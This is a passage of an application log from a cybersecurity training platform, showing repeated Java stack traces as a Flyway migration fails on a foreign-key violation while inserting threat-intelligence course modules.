    (5, 'Threat Intelligence Platforms & Tools', 'Master TIPs, MISP, STIX/TAXII, and other intelligence tools.', 3, 8),
    (5, 'Threat Hunting Methodologies', 'Proactive threat hunting techniques and hypothesis-driven investigations.', 4, 10),
    (5, 'Intelligence-Driven Defense', 'Operationalizing threat intelligence for defensive security.', 5, 5)

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23503
Error Code : 0
Message    : ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 20
Statement  : -- Modules for Threat Intelligence & Hunting
INSERT INTO modules (learning_path_id, name, description, order_index, estimated_hours)
VALUES 
    (5, 'Threat Intelligence Fundamentals', 'Core concepts of cyber threat intelligence and intelligence lifecycle.', 1, 8),
    (5, 'Threat Actor Analysis', 'Understanding threat actors, their motivations, tactics, and techniques.', 2, 9),
    (5, 'Threat Intelligence Platforms & Tools', 'Master TIPs, MISP, STIX/TAXII, and other intelligence tools.', 3, 8),
    (5, 'Threat Hunting Methodologies', 'Proactive threat hunting techniques and hypothesis-driven investigations.', 4, 10),
    (5, 'Intelligence-Driven Defense', 'Operationalizing threat intelligence for defensive security.', 5, 5)

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:29:12.537 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 00:29:12.540 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 00:29:12.635 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 00:29:12.745 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 00:29:12.746 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 00:29:12.746 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 00:29:12.941 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 00:29:12.980 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 4 migrations (execution time 00:00.022s)
2026-03-12 00:29:13.037 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": 2
2026-03-12 00:29:13.067 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "3 - Additional Learning Paths"
2026-03-12 00:29:13.094 [vert.x-eventloop-thread-1] ERROR o.f.core.internal.command.DbMigrate - Migration of schema "public" to version "3 - Additional Learning Paths" failed! Changes successfully rolled back.
2026-03-12 00:29:13.100 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Database migration failed
org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23503
Error Code : 0
Message    : ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 20
Statement  : -- Modules for Threat Intelligence & Hunting
INSERT INTO modules (learning_path_id, name, description, order_index, estimated_hours)
VALUES 
    (5, 'Threat Intelligence Fundamentals', 'Core concepts of cyber threat intelligence and intelligence lifecycle.', 1, 8),
    (5, 'Threat Actor Analysis', 'Understanding threat actors, their motivations, tactics, and techniques.', 2, 9),
    (5, 'Threat Intelligence Platforms & Tools', 'Master TIPs, MISP, STIX/TAXII, and other intelligence tools.', 3, 8),
    (5, 'Threat Hunting Methodologies', 'Proactive threat hunting techniques and hypothesis-driven investigations.', 4, 10),
    (5, 'Intelligence-Driven Defense', 'Operationalizing threat intelligence for defensive security.', 5, 5)

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23503
Error Code : 0
Message    : ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 20
Statement  : -- Modules for Threat Intelligence & Hunting
INSERT INTO modules (learning_path_id, name, description, order_index, estimated_hours)
VALUES 
    (5, 'Threat Intelligence Fundamentals', 'Core concepts of cyber threat intelligence and intelligence lifecycle.', 1, 8),
    (5, 'Threat Actor Analysis', 'Understanding threat actors, their motivations, tactics, and techniques.', 2, 9),
    (5, 'Threat Intelligence Platforms & Tools', 'Master TIPs, MISP, STIX/TAXII, and other intelligence tools.', 3, 8),
    (5, 'Threat Hunting Methodologies', 'Proactive threat hunting techniques and hypothesis-driven investigations.', 4, 10),
    (5, 'Intelligence-Driven Defense', 'Operationalizing threat intelligence for defensive security.', 5, 5)

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:29:13.106 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Error during startup
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:214)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23503
Error Code : 0
Message    : ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 20
Statement  : -- Modules for Threat Intelligence & Hunting
INSERT INTO modules (learning_path_id, name, description, order_index, estimated_hours)
VALUES 
    (5, 'Threat Intelligence Fundamentals', 'Core concepts of cyber threat intelligence and intelligence lifecycle.', 1, 8),
    (5, 'Threat Actor Analysis', 'Understanding threat actors, their motivations, tactics, and techniques.', 2, 9),
    (5, 'Threat Intelligence Platforms & Tools', 'Master TIPs, MISP, STIX/TAXII, and other intelligence tools.', 3, 8),
    (5, 'Threat Hunting Methodologies', 'Proactive threat hunting techniques and hypothesis-driven investigations.', 4, 10),
    (5, 'Intelligence-Driven Defense', 'Operationalizing threat intelligence for defensive security.', 5, 5)

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23503
Error Code : 0
Message    : ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 20
Statement  : -- Modules for Threat Intelligence & Hunting
INSERT INTO modules (learning_path_id, name, description, order_index, estimated_hours)
VALUES 
    (5, 'Threat Intelligence Fundamentals', 'Core concepts of cyber threat intelligence and intelligence lifecycle.', 1, 8),
    (5, 'Threat Actor Analysis', 'Understanding threat actors, their motivations, tactics, and techniques.', 2, 9),
    (5, 'Threat Intelligence Platforms & Tools', 'Master TIPs, MISP, STIX/TAXII, and other intelligence tools.', 3, 8),
    (5, 'Threat Hunting Methodologies', 'Proactive threat hunting techniques and hypothesis-driven investigations.', 4, 10),
    (5, 'Intelligence-Driven Defense', 'Operationalizing threat intelligence for defensive security.', 5, 5)

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:29:13.116 [vert.x-eventloop-thread-0] ERROR i.v.c.i.l.c.VertxIsolatedDeployer - Failed in deploying verticle
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:214)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23503
Error Code : 0
Message    : ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 20
Statement  : -- Modules for Threat Intelligence & Hunting
INSERT INTO modules (learning_path_id, name, description, order_index, estimated_hours)
VALUES 
    (5, 'Threat Intelligence Fundamentals', 'Core concepts of cyber threat intelligence and intelligence lifecycle.', 1, 8),
    (5, 'Threat Actor Analysis', 'Understanding threat actors, their motivations, tactics, and techniques.', 2, 9),
    (5, 'Threat Intelligence Platforms & Tools', 'Master TIPs, MISP, STIX/TAXII, and other intelligence tools.', 3, 8),
    (5, 'Threat Hunting Methodologies', 'Proactive threat hunting techniques and hypothesis-driven investigations.', 4, 10),
    (5, 'Intelligence-Driven Defense', 'Operationalizing threat intelligence for defensive security.', 5, 5)

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23503
Error Code : 0
Message    : ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 20
Statement  : -- Modules for Threat Intelligence & Hunting
INSERT INTO modules (learning_path_id, name, description, order_index, estimated_hours)
VALUES 
    (5, 'Threat Intelligence Fundamentals', 'Core concepts of cyber threat intelligence and intelligence lifecycle.', 1, 8),
    (5, 'Threat Actor Analysis', 'Understanding threat actors, their motivations, tactics, and techniques.', 2, 9),
    (5, 'Threat Intelligence Platforms & Tools', 'Master TIPs, MISP, STIX/TAXII, and other intelligence tools.', 3, 8),
    (5, 'Threat Hunting Methodologies', 'Proactive threat hunting techniques and hypothesis-driven investigations.', 4, 10),
    (5, 'Intelligence-Driven Defense', 'Operationalizing threat intelligence for defensive security.', 5, 5)

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
